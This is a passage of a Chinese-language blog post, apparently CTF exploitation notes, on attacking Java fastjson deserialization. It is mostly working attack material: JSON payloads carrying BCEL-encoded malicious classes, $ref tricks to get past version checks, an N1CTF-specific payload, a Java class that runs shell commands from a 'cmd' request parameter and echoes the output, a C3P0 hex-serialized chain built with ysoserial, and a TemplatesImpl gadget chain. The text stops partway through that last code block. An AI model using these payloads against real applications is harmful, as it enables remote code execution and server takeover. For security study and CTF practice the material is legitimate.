class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91$ddN$h1$Q$85$8f$93$F$c36$U$I$3f$fd$_$BZ$I$m$c8M$ef$82P$R$C$vR$g$aa$s$82k$c7$98$c4$c8$d8$d1$ae7$e2$b5$b8$81$aa$X$3c$A$PUu$i$w$b2R$bb$96$f6h$ce$7c$c7$b3$9a$7d$fc$fd$eb$B$c0$Xl$c6$98$c4r$8cWx$3d$857A$dfr$bc$e3x$cf0$b9$af$ad$f6$H$M$c5$ea$d6$ZCt$e4$$$U$c3lS$5b$d5$ca$ae$bb$w$e9$88$ae$n$a7$dctR$983$91$e8P$ff5$p$df$d7$v$dd$d1$3c$kjSg$88$8fo$a4$gx$edl$ca$f1$81$e3$p$c7$KG$85c$95zm$97$rR$9d$e8$Q$9c$O$81$bd$x1$U$rpLq$ac$95$b0$8eO$M$cbn$a0leWTh$98$cc$8c$f0$$$d9$T$83A$J$9f$b1A$f3B$8ca$$$EkF$d8$5e$ed$b4$7b$a5$a4gX$YY$da$d5$g$a7$cf$df$c0P$Z$83GF$a4i$cb$f9$T$97$d9$8b$i$b22FZ$ae$9d$c9$fe7$e5$fb$$O$ec$8c$89D$5d$g$gWk$d8$nm$p$b4$3b$o$e9$v$ff$ff$91$NcTO$98C$vU$9a$e6$90$f91$f2$p$b3$5e_$d3Bb$ba$e5$b9X$aan5$ffah$bd$91$baQ$92a$b3$9a$eb$b6$7d$a2m$af$9e$P$7cO$5c$98X$c7$w$s$e8$bf$87$87$d1$a1$3d$a3$80i$aa$be$922$d2$97$db$f7$60$3fQ$u$X$ef$Q$9d$df$92S$40$i$7c$U$e9$3d$8b$I$f3$98A$Z$_$a8$w$3d$rHgF$g$9c$Jb$e6$88$vc$81$ba$8b$a3$fc$d2$l$aa$ee$90$ebu$C$A$A&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h4 id="版本在1-2-25-1-2-32使用-ref调用getter"><a href="#版本在1-2-25-1-2-32使用-ref调用getter" class="headerlink" title="版本在1.2.25-1.2.32使用$ref调用getter"></a>版本在1.2.25-1.2.32使用$ref调用getter</h4><p>$ref要想在低版本(&lt;&#x3D;1.2.36)调用getter，要进行绕过（代码审计看不懂）</p><p>重点好像在<code>connection</code></p><p>依次使用</p><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#恶意类放入mapping</span>[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,]</code></pre></div><div class="code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">#调用getter</span>[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>.....&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.connection&quot;</span>&#125;&#125;]</code></pre></div><h4 id="在N1CTF的具体操作"><a href="#在N1CTF的具体操作" class="headerlink" title="在N1CTF的具体操作"></a>在N1CTF的具体操作</h4><p>SpringBoot fastJsonHttpMessageConverters进行JSON.parse的时候会默认设置期望类为路由参数里对应的类，也就是期望类为com.n1ctf.oldfastjson.User</p><p>导致了Root context变为了com.n1ctf.oldfastjson.User对象，因为<code>x并不是User的Field</code>，会被设置为null，导致了之前构造payload里面的各种引用都需要更改</p><p>具体操作：</p><p>把上面的数组放入<code>value</code>的位置</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;asd&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;asd&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.friend[1]&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dV$5bW$hU$U$fe$86$5c$ce0$9d$96$Q$a0eZ$LE$a9$N$F$82$d6kC$c5$om$z$g$$$S$E$91z$99L$O$c9$c0d$86$ce$85$e2$b5$5e$ea$fd$5e$9f$fd$F$3e$f9$92$b6$ba$ea$ea$83k$e9$f2$c1W$97$P$fa$e2$8b$fe$Ju$9f$5c$m$90$d4$5cN$ce$f9$f6$3e$7b$ef$f3$ed$7dv$e6$e7$7f$be$fd$k$c0$fd$f8RA$x$kWp$k$93bxB$c6$93$K$d2$98$921$cd0$a3$80a$96$e1$v$Fs$c8$I$cdy$ZO$LpA$c6$a2$8cg$Y$96d$9c$90$f1$ac$8ce$Z$X$Y$9eS$f0$3c$5e$Q$c3$8b$Ktd$Vt$c1$90$91$T$bf$5c$M$x2$f2$M$F$F$3d0$c5$b0$w$865$GKB$f4$94i$9b$fe$98$84Pb$60ABx$c2$c9q$Jmi$d3$e6$d3A1$cb$ddy$3dk$R$SO$3b$86n$z$e8$ae$v$d6U0$ec$XL$8fl$a4$cfn$98$d6$a8$84N$97_$M$b8$e7O8$b6$cf7$fd$f3$8e$95$e3$ae$84$f6$f4$aa$be$a1$8fX$ba$9d$l$99$b0t$cf$pU$a9$u$e1$60$j$ee$f2$V$8b$h$fe$c8$U$f7$LN$8e$UBNvU$b8$ddV$99$c9$ae$92$G$89X$d5$8d$E$d9$e5$de$bac$7b$UK$c8$u$e6v$eag$7c$d7$b4$f3$a4$l$s$R$85$d9$b1$dcL$Yu$C$7f$3d$m$5b$7b$d6$J$f1$X$5d$d3$X1wUtMgdv$h$s$f5$bd$Z_7$d6$a6$f4$f52$FD$n$r$8c$a1H$e9$a2$b4HP$cen$g$7c$dd7$v$s$G$9b$c1aXg$b8$c8$40$s$95$8c$T$b8$G$3fg$K$eaZ$FeI$e1C$c5$5d$e8g$f0T$f8$ITl$e0$92$84S$8e$9bOz$o$a0$fc$8a$ab$X$f9$r$c7$5dK$5e$e2$d9$a4Qa6Ye$m9$d7$84p$86M$V$_$e1e$caG$9e$fbU$8dq$9f$O$9c$N$7cND$b4$edJ$87$8aW$f0$aa$84$d8n$aa$e9$5c$w$5e$c3$eb$w$$$e3$N$8a$7f$db$9a$8a7$c5$8e$3de$a4$96$B$95V$b3$ba$I$b7$cc$60l7$d9$SZLJQ$8bW$a0a$d8$a0$ba$uk$E$bei$8dd$M$dd$b6E$e8o$a9x$hWT$bc$83w$Z$deS$f1$3e$3e$Q$E$7dH$5b$$$8c$ab$f8$I$l$ab$f8$E$9f$S$81$e4$ad$96$ac$8e$s$b9R$f1$Z$3eW$f1$F$faU$5cE$3fU$81$60$5cB$f7$edj$ae$ce$cc$e4$ccV$g$r$i$d9$c5$d6$b4$e3$9fs$C$3bW$a7$d2$bb$ad2$edd$C$a3P$b1X$a71$d8$e8u$d2$de$a0$x$r$c4$f3$baK$87i$eer$d2$b2x$5e$b7$c6$N$83$7b$5e$9dJ$j$bb$f3$F$97$eb$U$fe$5e$pp$5dn$fb$b5ugb$m$bd$5b$8b$w$b8$8b$7cU$eb$a5$7c$9e$b4$a3$97o$a9$b6C$bdN$q$f64$VP$S$y$9a$94$R$JG$T$8d$d7$ab$c1$o$d9j$t$ffg$b8a$e9$$$cf$d5$98$3f$ddd$efr$c3$de$81$ff$eb$XQ$93$f8$5c$a32$3c$99h$ec$Z$cb$8d$d0$40$b3$ce$o$Ln$w$c7$e9h$a4c$b4Ru$b5$a0$db$b7$c5s$81$ed$9bE$5e$bd$p$b5E$d7$O$TUX$f4$p$be$c9$a9$fc$T$89$s$N$a9$7e$c7$ac$eb$88$ac$8f$eepU$F$r$ec$pW$936$b5$$$da$c9uj$a7$Hj$eeD$Fo$Lh$7bw$a2$a9$404$7c5$f0$f8$Zn$99$c5$caM$3av$fb$q$d6$dfSq$I$9b$Khw$91muUVn$a6$96$zHhb$91$iGV$ac$40t$82$88a9$kG$l$ee$a4$7f$3a$f1$a2$ff$G$d1$R$d1$82$a3$b4$f8$jQ$u$84$fe$7d$fc$g$a4$ebh$v$n$U$P$97$QI$P$c6$a3$a1$9b$60$r$c8SC$S$cdZKP$a6$87K$d8$TW$x$f8$de$a9$a1$e1$w$9e$K$97$F$fb$g$F$R$z$y$qma$92$y$85$e2$b1LY$ac$85i$ddJ$ebvZ$x$b7$QKE$b5$e8$8f$60$f1x$w$g$bd$89$YI$3a2K$e1xgf$v$a2E3$v$f6$j$ba$96$aec$bfF$d6$P$94$d0$7d$NZ$fc$60$J$87J$b8$p$rk$R$e1$e1$f0$96o$zRu$7e$L$3d$a9V$adU$93K$e8$d5$I8$o$86$beo$e8$b0$n$dcM$e3$i$3ai$dc$870b$f4$8e$e3$Q$3a$88$92$$$dc$87$fd$YC7$3d0hX$qt$N$87$a9A$f7$e0$Kz$a9$5d$f6$e1$x$a2$f2$G$R$f8$Ti$ffJ$96$fe$c01$fc$89$E$fe$c2q$9a$B$x$VB$J$Z$a0$df$Y$7e$p$7c$90H$3f$84_0$84$e12$f1$3f$m$89$R$8ac$M_$e3$k$9a$85$c9$d3U$dcK$b3$I$f9Z$c5$J$8a$oJ$9e$d2$f44$f3$A$3d$9a$dc$m$ad$H$J$93$c9c$i$P$e1aJ$e6I$b2$de$D$e9_$K$8a1$a4$YF$ZN1$3cR$fb$8c$91$fcQ$fa$aad$f34$c6$f1$Y$sp$86$e28KX$L$ce$fd$H$b6$d8$a1$99$$$J$A$A&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.friend.connection&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;asd&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;asd&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>相比之前的数组，在原来的基础上添加了<code>.friend</code></p><p><code>&quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$.friend[1]&quot;&#125;,</code> </p><p><code>&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.friend.connection&quot;&#125;</code></p><p>具体的恶意类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        <span class="hljs-type">Class</span> <span class="hljs-variable">requestContextHolder</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> requestContextHolder.getDeclaredMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>);        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> m.invoke(obj);        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> m.invoke(obj);        m = request.getClass().getMethod(<span class="hljs-string">&quot;getParameter&quot;</span>, String.class);        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (String) m.invoke(request, <span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span>(cmd == <span class="hljs-literal">null</span>)&#123;            cmd = <span class="hljs-string">&quot;id&quot;</span>;        &#125;        String[] cmds = &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();        <span class="hljs-comment">//        读取f111111ag.txt的内容</span><span class="hljs-comment">//        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(&quot;f111111ag.txt&quot;);;</span><span class="hljs-comment">//        output = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;).next();</span>        m = response.getClass().getMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> (PrintWriter) m.invoke(response);        printWriter.println(output);        printWriter.flush();        printWriter.close();    &#125;&#125;</code></pre></div><h2 id="commons-io-写文件-wbshell"><a href="#commons-io-写文件-wbshell" class="headerlink" title="commons-io 写文件&#x2F;wbshell"></a>commons-io 写文件&#x2F;wbshell</h2><h2 id="C3P0二次反序列化-之hex序列化字节"><a href="#C3P0二次反序列化-之hex序列化字节" class="headerlink" title="C3P0二次反序列化 之hex序列化字节"></a>C3P0二次反序列化 之hex序列化字节</h2><p>记得有<code>;</code>号      <strong>! ! ! ! ! ! ! ! !</strong></p><div class="code-wrapper"><pre><code class="hljs perl">&#123;    <span class="hljs-string">&quot;rand1&quot;</span>: &#123;        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,        <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>    &#125;,    <span class="hljs-string">&quot;rand2&quot;</span>: &#123;        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,        <span class="hljs-string">&quot;userOverridesAsString&quot;</span>: <span class="hljs-string">&quot;HexAsciiSerializedMap:hexstring;&quot;</span>,    &#125;&#125;</code></pre></div><p><code>java -jar ysoserial-all.jar CommonsCollections2 &quot;calc&quot; &gt; calc.ser</code></p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">com</span>.<span class="hljs-property">alibaba</span>.<span class="hljs-property">fastjson</span>.<span class="hljs-property">JSON</span>;<span class="hljs-keyword">import</span> <span class="hljs-variable">com</span>.<span class="hljs-property">mchange</span>.<span class="hljs-property">lang</span>.<span class="hljs-property">ByteUtils</span>;<span class="hljs-keyword">import</span> <span class="hljs-variable">com</span>.<span class="hljs-property">mchange</span>.<span class="hljs-property">v2</span>.<span class="hljs-property">c3p0</span>.<span class="hljs-property">WrapperConnectionPoolDataSource</span>;<span class="hljs-keyword">import</span> <span class="hljs-variable">java</span>.<span class="hljs-property">io</span>.<span class="hljs-operator">*</span>;<span class="hljs-keyword">import</span> <span class="hljs-variable">java</span>.<span class="hljs-property">util</span>.<span class="hljs-property">Arrays</span>;<span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0Test</span> &#123;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">IOException</span>, <span class="hljs-title class_">ClassNotFoundException</span> &#123;        <span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;/Users/xxx/Desktop/calc.ser&quot;</span>);        <span class="hljs-variable">byte</span>[] <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-title function_">toByteArray</span>(<span class="hljs-keyword">in</span>);        <span class="hljs-keyword">in</span>.<span class="hljs-property">close</span>();        <span class="hljs-title class_">String</span> <span class="hljs-title class_">HexString</span> <span class="hljs-operator">=</span> <span class="hljs-title function_">bytesToHexString</span>(<span class="hljs-variable">data</span>, <span class="hljs-variable">data</span>.<span class="hljs-property">length</span>);        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-title class_">HexString</span>);        <span class="hljs-title class_">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>e<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>@type<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>java.lang.Class<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>val<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource<span class="hljs-char escape_">\&quot;</span>&#125;,<span class="hljs-char escape_">\&quot;</span>f<span class="hljs-char escape_">\&quot;</span>:&#123;<span class="hljs-char escape_">\&quot;</span>@type<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>userOverridesAsString<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>HexAsciiSerializedMap:&quot;</span><span class="hljs-operator">+</span><span class="hljs-title class_">HexString</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;;<span class="hljs-char escape_">\&quot;</span>&#125;&#125;&quot;</span>;        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-variable">poc</span>);    &#125;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">byte</span>[] <span class="hljs-title function_">toByteArray</span>(<span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">IOException</span> &#123;        <span class="hljs-variable">byte</span>[] classBytes;        classBytes <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-variable">byte</span>[<span class="hljs-keyword">in</span>.<span class="hljs-property">available</span>()];        <span class="hljs-keyword">in</span>.<span class="hljs-property">read</span>(classBytes);        <span class="hljs-keyword">in</span>.<span class="hljs-property">close</span>();        <span class="hljs-keyword">return</span> classBytes;    &#125;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">bytesToHexString</span>(<span class="hljs-params">byte</span>[] <span class="hljs-params">bArray</span>, <span class="hljs-params">int</span> <span class="hljs-params">length</span>) &#123;        <span class="hljs-title class_">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-variable">length</span>);        <span class="hljs-keyword">for</span>(int <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-variable">i</span> <span class="hljs-operator">&lt;</span> <span class="hljs-variable">length</span>; <span class="hljs-operator">+</span><span class="hljs-operator">+</span><span class="hljs-variable">i</span>) &#123;            <span class="hljs-title class_">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Integer</span>.<span class="hljs-property">toHexString</span>(<span class="hljs-number">255</span> <span class="hljs-operator">&amp;</span> <span class="hljs-variable">bArray</span>[<span class="hljs-variable">i</span>]);            <span class="hljs-keyword">if</span> (<span class="hljs-variable">sTemp</span>.<span class="hljs-property">length</span>() <span class="hljs-operator">&lt;</span> <span class="hljs-number">2</span>) &#123;                <span class="hljs-variable">sb</span>.<span class="hljs-property">append</span>(<span class="hljs-number">0</span>);            &#125;            <span class="hljs-variable">sb</span>.<span class="hljs-property">append</span>(<span class="hljs-variable">sTemp</span>.<span class="hljs-property">toUpperCase</span>());        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">sb</span>.<span class="hljs-property">toString</span>();    &#125;&#125;</code></pre></div><h1 id="fastjson-toString-JSONObject和JSONArray都行"><a href="#fastjson-toString-JSONObject和JSONArray都行" class="headerlink" title="fastjson#toString(JSONObject和JSONArray都行)"></a>fastjson#toString(JSONObject和JSONArray都行)</h1><h2 id="借助XString和HotSwappableTargetSource触发toString"><a href="#借助XString和HotSwappableTargetSource触发toString" class="headerlink" title="借助XString和HotSwappableTargetSource触发toString"></a>借助XString和HotSwappableTargetSource触发toString</h2><div class="code-wrapper"><pre><code class="hljs reasonml">#XString触发Fastjson#toStringimport com.alibaba.fastjson.JSONObject;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.target.HotSwappableTargetSource; import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap; public <span class="hljs-keyword">class</span> fj_gadget &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;         byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);         set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);         JSONObject jo = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONObject()</span>;        jo.put(<span class="hljs-string">&quot;1&quot;</span>,templatesimpl);         HotSwappableTargetSource h1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">jo</span>)</span>;<span class="hljs-comment">//        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;));</span>        HotSwappableTargetSource h2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">new</span> Object()</span>);         HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        hashMap.put(h1,h1);        hashMap.put(h2,h2);         Class clazz=h2.get<span class="hljs-constructor">Class()</span>;        Field transformerdeclaredField = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;target&quot;</span>)</span>;        transformerdeclaredField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        transformerdeclaredField.set(h2,<span class="hljs-keyword">new</span> <span class="hljs-constructor">XString(<span class="hljs-string">&quot;xxx&quot;</span>)</span>);         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(serial(hashMap));        String payload = <span class="hljs-string">&quot;...&quot;</span>;        <span class="hljs-comment">//        deserial(payload);</span>     &#125;     public static String serial(Object o) throws IOException &#123;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span 